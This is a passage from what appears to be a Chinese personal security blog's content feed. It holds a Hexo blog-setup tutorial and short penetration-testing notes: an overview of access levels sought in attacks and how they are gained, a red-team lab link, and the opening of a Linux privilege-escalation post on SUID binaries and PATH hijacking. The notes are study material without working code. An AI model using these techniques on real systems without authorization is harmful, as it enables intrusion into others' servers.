<li>财务应用系统服务器</li>
<li>核心产品源码服务器（自建 SVN、GIT）</li>
<li>数据库服务器</li>
<li>文件或网盘服务器、共享服务器</li>
<li>电子邮件服务器</li>
<li>网络监控系统服务器</li>
<li>其他服务器（内部技术文档服务器、其他监控服务器等）</li>
</ol>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>红队实战演练环境：<a href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug%EF%BC%8C%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Ataqu">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug，提取码：taqu</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建部署博客</title>
    <url>/2021/01/29/%E6%90%AD%E5%BB%BA%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>环境：CentOS8.1</p>
<p>配置：nodejs、cnpm、git、hexo</p>
<p>注意：配置时需要root权限，所以登录root用户</p>
<span id="more"></span>
<h2 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h2><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum -y install nodejs</span><br></pre></td></tr></table></figure>

<p>测试安装是否成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# node -v</span><br><span class="line">v10.21.0</span><br><span class="line">[root@localhost ~]# npm -v</span><br><span class="line">6.14.4</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示版本即可</span></span><br></pre></td></tr></table></figure>



<h2 id="安装cnpm"><a href="#安装cnpm" class="headerlink" title="安装cnpm"></a>安装cnpm</h2><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p>测试安装是否成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cnpm -v</span><br><span class="line">cnpm@6.1.1 (/usr/local/lib/node_modules/cnpm/lib/parse_argv.js)</span><br><span class="line">npm@6.14.11 (/usr/local/lib/node_modules/cnpm/node_modules/npm/lib/npm.js)</span><br><span class="line">node@10.21.0 (/usr/bin/node)</span><br><span class="line">npminstall@3.28.0 (/usr/local/lib/node_modules/cnpm/node_modules/npminstall/lib/index.js)</span><br><span class="line">prefix=/usr/local </span><br><span class="line">linux x64 4.18.0-147.el8.x86_64</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 有上述信息即可</span></span><br></pre></td></tr></table></figure>



<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>测试安装是否成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# hexo -v</span><br><span class="line">hexo-cli: 4.2.0</span><br><span class="line">os: Linux 4.18.0-147.el8.x86_64 linux x64</span><br><span class="line">http_parser: 2.9.3</span><br><span class="line">node: 10.21.0</span><br><span class="line">v8: 6.8.275.32-node.56</span><br><span class="line">uv: 1.34.2</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.7</span><br><span class="line">ares: 1.15.0</span><br><span class="line">modules: 64</span><br><span class="line">nghttp2: 1.41.0</span><br><span class="line">napi: 6</span><br><span class="line">openssl: 1.1.1c</span><br><span class="line">icu: 64.2</span><br><span class="line">unicode: 12.1</span><br><span class="line">cldr: 35.1</span><br><span class="line">tz: 2019c</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 有上述信息即可</span></span><br></pre></td></tr></table></figure>



<h2 id="初始化博客目录"><a href="#初始化博客目录" class="headerlink" title="初始化博客目录"></a>初始化博客目录</h2><p>创建blog目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--查看当前路径</span><br><span class="line">[root@localhost ~]# pwd</span><br><span class="line">/root</span><br><span class="line">--在root目录下创建blog目录</span><br><span class="line">[root@localhost ~]# mkdir blog</span><br><span class="line">--进入blog目录</span><br><span class="line">[root@localhost ~]# cd blog/</span><br><span class="line">[root@localhost blog]# pwd</span><br><span class="line">/root/blog</span><br></pre></td></tr></table></figure>

<p>初始化blog目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo init</span><br><span class="line">INFO  Cloning hexo-starter https://github.com/hexojs/hexo-starter.git</span><br><span class="line">WARN  git clone failed. Copying data instead</span><br><span class="line">FATAL &#123; err:</span><br><span class="line">   &#123; Error: ENOENT: no such file or directory, scandir &#x27;/usr/local/lib/node_modules/hexo-cli/assets&#x27;</span><br><span class="line">     errno: -2,</span><br><span class="line">     code: &#x27;ENOENT&#x27;,</span><br><span class="line">     syscall: &#x27;scandir&#x27;,</span><br><span class="line">     path: &#x27;/usr/local/lib/node_modules/hexo-cli/assets&#x27; &#125; &#125; &#x27;Something\&#x27;s wrong. Maybe you can find the solution here: %s&#x27; &#x27;\u001b[4mhttp://hexo.io/docs/troubleshooting.html\u001b[24m&#x27;</span><br><span class="line">[root@localhost blog]# cd blog</span><br><span class="line">bash: cd: blog: 没有那个文件或目录</span><br></pre></td></tr></table></figure>

<p>但出现上述信息</p>
<p>解决：安装git即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# yum -y install git</span><br></pre></td></tr></table></figure>

<p>再进行初始化blog目录操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo init</span><br><span class="line">INFO  Cloning hexo-starter https://github.com/hexojs/hexo-starter.git</span><br><span class="line">INFO  Install dependencies</span><br><span class="line">added 188 packages from 443 contributors and audited 194 packages in 34.925s</span><br><span class="line"></span><br><span class="line">15 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line"></span><br><span class="line">INFO  Start blogging with Hexo!</span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示如上信息即可</span></span><br></pre></td></tr></table></figure>

<p>查看现在blog目录内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# ls -l</span><br><span class="line">总用量 76</span><br><span class="line">-rw-r--r--.   1 root root     0 1月  27 11:19 _config.landscape.yml</span><br><span class="line">-rw-r--r--.   1 root root  2439 1月  27 11:19 _config.yml</span><br><span class="line">drwxr-xr-x. 165 root root  8192 1月  27 11:20 node_modules</span><br><span class="line">-rw-r--r--.   1 root root   615 1月  27 11:19 package.json</span><br><span class="line">-rw-r--r--.   1 root root 56654 1月  27 11:20 package-lock.json</span><br><span class="line">drwxr-xr-x.   2 root root    52 1月  27 11:19 scaffolds</span><br><span class="line">drwxr-xr-x.   3 root root    20 1月  27 11:19 source</span><br><span class="line">drwxr-xr-x.   2 root root    22 1月  27 11:19 themes</span><br></pre></td></tr></table></figure>

<p>启动博客（在本地<a href="http://localhost:4000端口）">http://localhost:4000端口）</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo s</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure>

<p>（配访问结果图）</p>
<h2 id="创建一篇新博客"><a href="#创建一篇新博客" class="headerlink" title="创建一篇新博客"></a>创建一篇新博客</h2><p>创建一篇博客：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo n &quot;我的第一篇博客文章&quot;</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Created: ~/blog/source/_posts/我的第一篇博客文章.md</span><br></pre></td></tr></table></figure>

<p>博客存放位置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# pwd</span><br><span class="line">/root/blog</span><br><span class="line">[root@localhost blog]# ls</span><br><span class="line">_config.landscape.yml  db.json       package.json       scaffolds  themes</span><br><span class="line">_config.yml            node_modules  package-lock.json  source</span><br><span class="line">[root@localhost blog]# cd source/_posts/</span><br><span class="line">[root@localhost _posts]# </span><br><span class="line">[root@localhost _posts]# ls -l</span><br><span class="line">总用量 8</span><br><span class="line">-rw-r--r--. 1 root root  75 1月  27 11:23 我的第一篇博客文章.md</span><br><span class="line">-rw-r--r--. 1 root root 838 1月  27 11:19 hello-world.md</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 博客都存放在<span class="string">&quot;~blog/source/_posts/&quot;</span>路径下</span></span><br></pre></td></tr></table></figure>

<p>编辑博客：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost _posts]# vim 我的第一篇博客文章.md</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用markdown语法进行编辑</span></span><br></pre></td></tr></table></figure>

<p>返回到blog目录下，将新的博客部署到本地：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost _posts]# cd ../..</span><br><span class="line">[root@localhost blog]# pwd</span><br><span class="line">/root/blog</span><br><span class="line">[root@localhost blog]# ls</span><br><span class="line">_config.landscape.yml  db.json       package.json       scaffolds  themes</span><br><span class="line">_config.yml            node_modules  package-lock.json  source</span><br><span class="line">[root@localhost blog]# </span><br><span class="line">[root@localhost blog]# hexo clean</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Deleted database.</span><br><span class="line">[root@localhost blog]# </span><br><span class="line">[root@localhost blog]# hexo g</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Files loaded in 168 ms</span><br><span class="line">INFO  Generated: archives/index.html</span><br><span class="line">INFO  Generated: archives/2021/index.html</span><br><span class="line">INFO  Generated: archives/2021/01/index.html</span><br><span class="line">INFO  Generated: index.html</span><br><span class="line">INFO  Generated: fancybox/jquery.fancybox.min.css</span><br><span class="line">INFO  Generated: js/script.js</span><br><span class="line">INFO  Generated: css/style.css</span><br><span class="line">INFO  Generated: 2021/01/27/我的第一篇博客文章/index.html</span><br><span class="line">INFO  Generated: 2021/01/27/hello-world/index.html</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.woff2</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.woff</span><br><span class="line">INFO  Generated: fancybox/jquery.fancybox.min.js</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.ttf</span><br><span class="line">INFO  Generated: js/jquery-3.4.1.min.js</span><br><span class="line">INFO  Generated: css/fonts/FontAwesome.otf</span><br><span class="line">INFO  Generated: css/images/banner.jpg</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.eot</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.svg</span><br><span class="line">INFO  18 files generated in 460 ms</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示上述信息即可</span></span><br></pre></td></tr></table></figure>

<p>再次启动并访问：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo s</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure>



<h2 id="将本地博客部署到GitHub上"><a href="#将本地博客部署到GitHub上" class="headerlink" title="将本地博客部署到GitHub上"></a>将本地博客部署到GitHub上</h2><h3 id="GitHub设置"><a href="#GitHub设置" class="headerlink" title="GitHub设置"></a>GitHub设置</h3><p>（配图）</p>
<p>新建一个仓库 New repository</p>
<p>Repository name必须是”GitHub昵称.github.io”，我的就是”1ceC0la.github.io”</p>
<p>Description(optional 可选)：我的hexo博客</p>
<p>选择Pbulic</p>
<p>最后点击Create repository</p>
<h3 id="本地设置"><a href="#本地设置" class="headerlink" title="本地设置"></a>本地设置</h3><p>git部署插件安装指令(须在blog目录下)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# cnpm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>修改blog目录下的_config.yml文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# vim _config.yml</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改文件底部</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/1ceC0la/1ceC0la.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<h3 id="本地推到GitHub"><a href="#本地推到GitHub" class="headerlink" title="本地推到GitHub"></a>本地推到GitHub</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo d</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 期间需要输出GitHub用户名和密码</span></span><br></pre></td></tr></table></figure>

<p>（配访问图）</p>
<p>到此整个部署工作完成。</p>
<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>（默认主题换成yilia主题）</p>
<p>先将目标主题拷贝到本地themes目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br><span class="line">正克隆到 &#x27;themes/yilia&#x27;...</span><br><span class="line">remote: Enumerating objects: 1, done.</span><br><span class="line">remote: Counting objects: 100% (1/1), done.</span><br><span class="line">remote: Total 2037 (delta 0), reused 0 (delta 0), pack-reused 2036</span><br><span class="line">接收对象中: 100% (2037/2037), 10.53 MiB | 55.00 KiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (1079/1079), 完成.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示如上信息即可</span></span><br></pre></td></tr></table></figure>

<p>然后修改配置文件_config.yml：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# vim _config.yml</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将theme:landscape改成yilia，如下</span></span><br><span class="line">theme: yilia</span><br></pre></td></tr></table></figure>

<p>完成后生成新的博客</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo clean</span><br><span class="line">[root@localhost blog]# hexo g</span><br></pre></td></tr></table></figure>

<p>再推到GitHub上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo d</span><br></pre></td></tr></table></figure>

<p>结束。</p>
<h2 id="hexo命令"><a href="#hexo命令" class="headerlink" title="hexo命令"></a>hexo命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">init</span> [folder]</span><br></pre></td></tr></table></figure>

<p>新建一个网站。如果没有设置 <code>folder</code> ，Hexo 默认在目前的文件夹建立网站。</p>
<p>This command is a shortcut that runs the following steps:</p>
<ol>
<li>Git clone <a href="https://github.com/hexojs/hexo-starter">hexo-starter</a> including <a href="https://github.com/hexojs/hexo-theme-landscape">hexo-theme-landscape</a> into the current directory or a target folder if specified.</li>
<li>Install dependencies using a package manager: <a href="https://classic.yarnpkg.com/lang/en/">Yarn 1</a>, <a href="https://pnpm.js.org/">pnpm</a> or <a href="https://docs.npmjs.com/cli/install">npm</a>, whichever is installed; if there are more than one installed, the priority is as listed. npm is bundled with <a href="https://hexo.io/docs/#Install-Node-js">Node.js</a> by default.</li>
</ol>
<h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> [layout] &lt;<span class="built_in">title</span>&gt;</span><br></pre></td></tr></table></figure>

<p>新建一篇文章。如果没有设置 <code>layout</code> 的话，默认使用 <a href="https://hexo.io/zh-cn/docs/configuration">_config.yml</a> 中的 <code>default_layout</code> 参数代替。如果标题包含空格的话，请使用引号括起来。</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> <span class="string">&quot;post title with whitespace&quot;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-p</code>, <code>--path</code></td>
<td align="left">自定义新文章的路径</td>
</tr>
<tr>
<td align="left"><code>-r</code>, <code>--replace</code></td>
<td align="left">如果存在同名文章，将其替换</td>
</tr>
<tr>
<td align="left"><code>-s</code>, <code>--slug</code></td>
<td align="left">文章的 Slug，作为新文章的文件名和发布后的 URL</td>
</tr>
</tbody></table>
<p>默认情况下，Hexo 会使用文章的标题来决定文章文件的路径。对于独立页面来说，Hexo 会创建一个以标题为名字的目录，并在目录中放置一个 <code>index.md</code> 文件。你可以使用 <code>--path</code> 参数来覆盖上述行为、自行决定文件的目录：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">page</span> --path about/me <span class="string">&quot;About me&quot;</span></span><br></pre></td></tr></table></figure>

<p>以上命令会创建一个 <code>source/about/me.md</code> 文件，同时 Front Matter 中的 title 为 <code>&quot;About me&quot;</code></p>
<p>注意！title 是必须指定的！如果你这么做并不能达到你的目的：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> page <span class="comment">--path about/me</span></span><br></pre></td></tr></table></figure>

<p>此时 Hexo 会创建 <code>source/_posts/about/me.md</code>，同时 <code>me.md</code> 的 Front Matter 中的 title 为 <code>&quot;page&quot;</code>。这是因为在上述命令中，hexo-cli 将 <code>page</code> 视为指定文章的标题、并采用默认的 <code>layout</code>。</p>
<h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure>

<p>生成静态文件。</p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-d</code>, <code>--deploy</code></td>
<td align="left">文件生成后立即部署网站</td>
</tr>
<tr>
<td align="left"><code>-w</code>, <code>--watch</code></td>
<td align="left">监视文件变动</td>
</tr>
<tr>
<td align="left"><code>-b</code>, <code>--bail</code></td>
<td align="left">生成过程中如果发生任何未处理的异常则抛出异常</td>
</tr>
<tr>
<td align="left"><code>-f</code>, <code>--force</code></td>
<td align="left">强制重新生成文件 Hexo 引入了差分机制，如果 <code>public</code> 目录存在，那么 <code>hexo g</code> 只会重新生成改动的文件。 使用该参数的效果接近 <code>hexo clean &amp;&amp; hexo generate</code></td>
</tr>
<tr>
<td align="left"><code>-c</code>, <code>--concurrency</code></td>
<td align="left">最大同时生成文件的数量，默认无限制</td>
</tr>
</tbody></table>
<p>该命令可以简写为</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo g</span><br></pre></td></tr></table></figure>

<h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$ hexo publish [layout] <span class="tag">&lt;<span class="name">filename</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发表草稿。</p>
<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">server</span></span><br></pre></td></tr></table></figure>

<p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-p</code>, <code>--port</code></td>
<td align="left">重设端口</td>
</tr>
<tr>
<td align="left"><code>-s</code>, <code>--static</code></td>
<td align="left">只使用静态文件</td>
</tr>
<tr>
<td align="left"><code>-l</code>, <code>--log</code></td>
<td align="left">启动日记记录，使用覆盖记录格式</td>
</tr>
</tbody></table>
<h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo deploy</span><br></pre></td></tr></table></figure>

<p>部署网站。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-g</code>, <code>--generate</code></td>
<td align="left">部署之前预先生成静态文件</td>
</tr>
</tbody></table>
<p>该命令可以简写为：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo d</span><br></pre></td></tr></table></figure>

<h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">$ hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure>

<p>渲染文件。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-o</code>, <code>--output</code></td>
<td align="left">设置输出路径</td>
</tr>
</tbody></table>
<h3 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h3><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">$ hexo migrate &lt;<span class="keyword">type</span>&gt;</span><br></pre></td></tr></table></figure>

<p>从其他博客系统 <a href="https://hexo.io/zh-cn/docs/migration">迁移内容</a>。</p>
<h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo clean</span><br></pre></td></tr></table></figure>

<p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p>
<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">$ hexo list &lt;<span class="keyword">type</span>&gt;</span><br></pre></td></tr></table></figure>

<p>列出网站资料。</p>
<h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p>显示 Hexo 版本。</p>
<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--safe</span></span><br></pre></td></tr></table></figure>

<p>在安全模式下，不会载入插件和脚本。当您在安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p>
<h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--debug</span></span><br></pre></td></tr></table></figure>

<p>在终端中显示调试信息并记录到 <code>debug.log</code>。当您碰到问题时，可以尝试用调试模式重新执行一次，并 <a href="https://github.com/hexojs/hexo/issues/new">提交调试信息到 GitHub</a>。</p>
<h4 id="简洁模式"><a href="#简洁模式" class="headerlink" title="简洁模式"></a>简洁模式</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--silent</span></span><br></pre></td></tr></table></figure>

<p>隐藏终端信息。</p>
<h4 id="自定义配置文件的路径"><a href="#自定义配置文件的路径" class="headerlink" title="自定义配置文件的路径"></a>自定义配置文件的路径</h4><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"># 使用 custom<span class="variable">.yml</span> 代替默认的 <span class="number">_</span><span class="keyword">config</span><span class="variable">.yml</span></span><br><span class="line">$ hexo server --<span class="keyword">config</span> custom<span class="variable">.yml</span></span><br><span class="line"></span><br><span class="line"># 使用 custom<span class="variable">.yml</span> 和 custom2<span class="variable">.json</span>，其中 custom2<span class="variable">.json</span> 优先级更高</span><br><span class="line">$ hexo <span class="keyword">generate</span> --<span class="keyword">config</span> custom<span class="variable">.yml</span>,custom2<span class="variable">.json</span>,custom3<span class="variable">.yml</span></span><br></pre></td></tr></table></figure>

<p>自定义配置文件的路径，指定这个参数后将不再使用默认的 <code>_config.yml</code>。<br>你可以使用一个 YAML 或 JSON 文件的路径，也可以使用逗号分隔（无空格）的多个 YAML 或 JSON 文件的路径。例如：</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"># 使用 custom<span class="variable">.yml</span> 代替默认的 <span class="number">_</span><span class="keyword">config</span><span class="variable">.yml</span></span><br><span class="line">$ hexo server --<span class="keyword">config</span> custom<span class="variable">.yml</span></span><br><span class="line"></span><br><span class="line"># 使用 custom<span class="variable">.yml</span>, custom2<span class="variable">.json</span> 和 custom3<span class="variable">.yml</span>，其中 custom3<span class="variable">.yml</span> 优先级最高，其次是 custom2<span class="variable">.json</span></span><br><span class="line">$ hexo <span class="keyword">generate</span> --<span class="keyword">config</span> custom<span class="variable">.yml</span>,custom2<span class="variable">.json</span>,custom3<span class="variable">.yml</span></span><br></pre></td></tr></table></figure>

<p>当你指定了多个配置文件以后，Hexo 会按顺序将这部分配置文件合并成一个 <code>_multiconfig.yml</code>。如果遇到重复的配置，排在后面的文件的配置会覆盖排在前面的文件的配置。这个原则适用于任意数量、任意深度的 YAML 和 JSON 文件。</p>
<h4 id="显示草稿"><a href="#显示草稿" class="headerlink" title="显示草稿"></a>显示草稿</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--draft</span></span><br></pre></td></tr></table></figure>

<p>显示 <code>source/_drafts</code> 文件夹中的草稿文章。</p>
<h4 id="自定义-CWD"><a href="#自定义-CWD" class="headerlink" title="自定义 CWD"></a>自定义 CWD</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">$ hexo --cwd <span class="regexp">/path/</span>to/cwd</span><br></pre></td></tr></table></figure>

<p>自定义当前工作目录（Current working directory）的路径。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>CodeSheep的B站视频：</p>
<p><a href="https://www.bilibili.com/video/BV1q4411i7gL/?spm_id_from=333.788.recommend_more_video.0">https://www.bilibili.com/video/BV1q4411i7gL/?spm_id_from=333.788.recommend_more_video.0</a></p>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>yilia</tag>
      </tags>
  </entry>
  <entry>
    <title>网站权限后台漏洞获取</title>
    <url>/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<p><img src="/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/.png" alt="png"></p>
<p>具体有哪些权限需要掌握</p>
<ul>
<li><p>后台权限：（获得方式：爆破，注入猜解，弱口令等获取的账号密码配合登录）</p>
<p>一般网站或后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件（如后台功能存在文件操作的话也可以操作文件数据）</p>
</li>
<li><p>网站权限：（获得方式：以上三种思路获取）</p>
<p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备</p>
</li>
<li><p>数据库权限：<br>操作数据库的权限，数据库的增删改等，源码或配置文件泄露，也可能是网站权限（webshell）进行的数据库配置文件读取获得</p>
</li>
<li><p>接口权限：（邮件，短信，支付，第三方登录）</p>
<p>后台或网站权限后的获取途径了后台（修改配置信息功能点），网站权限（查看配置文件获取）</p>
</li>
<li><p>系统权限</p>
</li>
<li><p>域控权限</p>
</li>
</ul>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux定时任务&amp;环境变量&amp;数据库</title>
    <url>/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&amp;%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&amp;%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p><a href="https://www.freebuf.com/articles/system/173903.html">在Linux中使用环境变量进行提权</a></p>
<p>这里需要注意的是：</p>
<ol>
<li><p>文章中讲到的shell可执行文件是本身受害端就有的并且具有SUID权限</p>
</li>
<li><p><code>PATH=/tmp:$PATH</code>和<code>PATH=$PATH:/tmp</code>有点不同</p>
